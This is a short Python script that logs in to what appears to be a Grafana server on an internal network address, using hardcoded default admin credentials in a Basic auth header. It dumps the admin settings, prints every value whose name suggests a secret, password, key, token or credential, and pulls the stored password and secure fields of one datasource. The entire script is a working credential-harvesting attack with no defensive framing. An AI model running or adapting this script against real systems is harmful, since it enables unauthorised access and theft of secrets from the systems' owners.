import urllib.request, json

req = urllib.request.Request("http://172.18.0.1:3000/api/admin/settings")
req.add_header("Authorization", "Basic YWRtaW46YWRtaW4xMjM=")
resp = urllib.request.urlopen(req, timeout=10)
data = json.loads(resp.read())

# Print ALL masked/secret values
for section, vals in data.items():
    if isinstance(vals, dict):
        for k, v in vals.items():
            if v and str(v) == "*********":
                print(f"MASKED: [{section}] {k}")
            elif v and any(x in k.lower() for x in ["secret","pass","key","token","redis","cred"]):
                print(f"[{section}] {k} = {v}")

# Also try datasource endpoint
req2 = urllib.request.Request("http://172.18.0.1:3000/api/datasources/uid/dfw2k8mmd58n4f")
req2.add_header("Authorization", "Basic YWRtaW46YWRtaW4xMjM=")
resp2 = urllib.request.urlopen(req2, timeout=10)
ds = json.loads(resp2.read())
print(f"\nDatasource password: '{ds.get('password','')}'")
print(f"secureJsonData: {ds.get('secureJsonData',{})}")
print(f"secureJsonFields: {ds.get('secureJsonFields',{})}")
